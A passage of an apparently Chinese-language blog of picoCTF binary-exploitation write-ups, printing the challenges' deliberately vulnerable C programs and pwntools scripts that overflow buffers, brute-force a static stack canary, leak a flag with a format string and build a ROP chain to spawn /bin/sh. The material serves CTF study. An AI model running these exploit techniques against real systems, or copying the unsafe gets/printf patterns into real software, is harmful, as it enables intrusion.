class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your string: &quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要传入两个正确的参数，注意一个函数的栈空间从低地址到高地址依次为：变量区、ebp&#x2F;rbp、返回地址。需要将返回地址覆盖为win函数的起始地址，之后从逻辑上应该是win函数的返回地址，再之后才是win函数的参数。</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(b&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">65430</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please enter your string: &#x27;</span>, cyclic(<span class="number">112</span>) + p32(<span class="number">0x8049296</span>) + p32(<span class="number">0xDEADBEEF</span>) + p32(<span class="number">0xCAFEF00D</span>) + p32(<span class="number">0xF00DF00D</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>picoCTF{argum3nt5_4_d4yZ_b3fd8f66}</p><h2 id="8-buffer-overflow-3"><a href="#8-buffer-overflow-3" class="headerlink" title="8. buffer overflow 3"></a>8. buffer overflow 3</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;locale.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CANARY_SIZE 4</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[FLAGSIZE];</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(buf,FLAGSIZE,f); <span class="comment">// size bound read</span></span><br><span class="line">  <span class="built_in">puts</span>(buf);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> global_canary[CANARY_SIZE];</span><br><span class="line"><span class="type">void</span> <span class="title function_">read_canary</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;canary.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;canary.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging canary.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fread(global_canary,<span class="keyword">sizeof</span>(<span class="type">char</span>),CANARY_SIZE,f);</span><br><span class="line">  fclose(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="type">char</span> canary[CANARY_SIZE];</span><br><span class="line">   <span class="type">char</span> buf[BUFSIZE];</span><br><span class="line">   <span class="type">char</span> length[BUFSIZE];</span><br><span class="line">   <span class="type">int</span> count;</span><br><span class="line">   <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">   <span class="built_in">memcpy</span>(canary,global_canary,CANARY_SIZE);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;How Many Bytes will You Write Into the Buffer?\n&gt; &quot;</span>);</span><br><span class="line">   <span class="keyword">while</span> (x&lt;BUFSIZE) &#123;</span><br><span class="line">      read(<span class="number">0</span>,length+x,<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (length[x]==<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">      x++;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">sscanf</span>(length,<span class="string">&quot;%d&quot;</span>,&amp;count);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Input&gt; &quot;</span>);</span><br><span class="line">   read(<span class="number">0</span>,buf,count);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">memcmp</span>(canary,global_canary,CANARY_SIZE)) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;***** Stack Smashing Detected ***** : Canary Value Corrupt!\n&quot;</span>); <span class="comment">// crash immediately</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Ok... Now Where&#x27;s the Flag?\n&quot;</span>);</span><br><span class="line">   fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Set the gid to the effective gid</span></span><br><span class="line">  <span class="comment">// this prevents /bin/sh from dropping the privileges</span></span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  read_canary();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加了一个canary，每一次的canary都一样，有read函数可以精确控制写入字节数量，不会多写空字节，因此采用爆破的方式获取canary然后拿到flag。</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">60065</span>)</span><br><span class="line"></span><br><span class="line">canary = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload</span>(<span class="params">i, j</span>):</span><br><span class="line">ret = cyclic(<span class="number">64</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(j):</span><br><span class="line">ret += p8(canary[k])</span><br><span class="line"><span class="keyword">return</span> ret + p8(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">65</span> + j).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input&gt; &#x27;</span>, get_payload(i, j))</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;***** Stack Smashing Detected *****&#x27;</span> <span class="keyword">in</span> io.recv():</span><br><span class="line">io = remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">60065</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">canary[j] = i</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">io = remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">60065</span>)</span><br><span class="line"></span><br><span class="line">canary_value = canary[<span class="number">0</span>] + (canary[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + (canary[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (canary[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">64</span> + <span class="number">4</span> + <span class="number">16</span> + <span class="number">4</span>).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input&gt; &#x27;</span>, cyclic(<span class="number">64</span>) + p32(canary_value) + cyclic(<span class="number">16</span>) + p32(<span class="number">0x8049336</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>canary的值为BiRd</p><p>picoCTF{Stat1C_c4n4r13s_4R3_b4D_f9792127}</p><h2 id="9-flag-leak"><a href="#9-flag-leak" class="headerlink" title="9. flag leak"></a>9. flag leak</h2><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;locale.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">readflag</span><span class="params">(<span class="type">char</span>* buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(buf,len,f); <span class="comment">// size bound read</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="type">char</span> flag[BUFSIZE];</span><br><span class="line">   <span class="type">char</span> story[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">   readflag(flag, FLAGSIZE);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Tell me a story and then I&#x27;ll tell you one &gt;&gt; &quot;</span>);</span><br><span class="line">   <span class="built_in">scanf</span>(<span class="string">&quot;%127s&quot;</span>, story);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s a story - \n&quot;</span>);</span><br><span class="line">   <span class="built_in">printf</span>(story);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Set the gid to the effective gid</span></span><br><span class="line">  <span class="comment">// this prevents /bin/sh from dropping the privileges</span></span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个格式化字符串漏洞，通过gdb调试发现偏移为24的地方留有flag的地址+4。flag前面4个字符已知，因此直接打印这个地址对应的值即可。</p><p>picoCTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}</p><h2 id="10-ropfu"><a href="#10-ropfu" class="headerlink" title="10. ropfu"></a>10. ropfu</h2><p>典型ROP攻击。</p><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 16</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set the gid to the effective gid</span></span><br><span class="line">  <span class="comment">// this prevents /bin/sh from dropping the privileges</span></span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  vuln();</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>能够在程序中找到大量的rop材料，但还需要一个&#x2F;bin&#x2F;sh字符串。需要首先调用库函数将&#x2F;bin&#x2F;sh写入bss段，然后再系统调用execve来getshell。具体一些，execve的系统调用需要eax&#x3D;0xB，ebx&#x3D;read_addr，ecx&#x3D;0，edx&#x3D;0。</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">53996</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;sh\0&#x27;</span>))<span class="comment"># &#x27;sh&#x27; addr, need to make ebx point to it</span></span><br><span class="line">sys_execve = <span class="number">0xb</span><span class="comment"># need to make eax be 0xb</span></span><br><span class="line"></span><br><span class="line">pop_eax_addr = <span class="number">0x80b074a</span></span><br><span class="line">pop_ebx_addr = <span class="number">0x8049022</span></span><br><span class="line">pop_ecx_addr = <span class="number">0x8049e39</span></span><br><span class="line">pop_edx_ebx_addr = <span class="number">0x80583c9</span></span><br><span class="line">int_80_addr = <span class="number">0x804a3d2</span></span><br><span class="line">read_addr = <span class="number">0x806ecf0</span></span><br><span class="line">vuln_addr = <span class="number">0x8049d95</span></span><br><span class="line">bss_addr = <span class="number">0x80e62f0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: read &#x27;/bin/sh&#x27; into bss segment and return to vuln() function</span></span><br><span class="line">payload = cyclic(<span class="number">28</span>)</span><br><span class="line">payload += p32(read_addr) + p32(vuln_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;grasshopper!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: use &#x27;int 80&#x27; to call SYS_execve, set argument as:</span></span><br><span class="line"><span class="comment"># eax = 0xb</span></span><br><span class="line"><span class="comment"># ebx = &#x27;/bin/sh&#x27; address</span></span><br><span class="line"><span class="comment"># ecx = edx = 0</span></span><br><span class="line">payload = cyclic(<span class="number">28</span>)</span><br><span class="line">payload += p32(pop_eax_addr) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ebx_addr) + p32(<span class="number">0</span>) + p32(bss_addr)</span><br><span class="line">payload += p32(pop_ecx_addr) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(int_80_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;grasshopper!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>picoCTF{5n47ch_7h3_5h311_e81af635}</p><h1 id="12-function-overwrite"><a href="#12-function-overwrite" class="headerlink" title="12. function overwrite"></a>12. function overwrite</h1><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;locale.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">calculate_story_score</span><span class="params">(<span class="type">char</span> *story, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> score = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    score += story[i];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> score;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">easy_checker</span><span class="params">(<span class="type">char</span> *story, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (calculate_story_score(story, len) == <span class="number">1337</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">char</span> buf[FLAGSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fgets(buf, FLAGSIZE, f); <span class="comment">// size bound read</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;re 1337. Here&#x27;s the flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"> 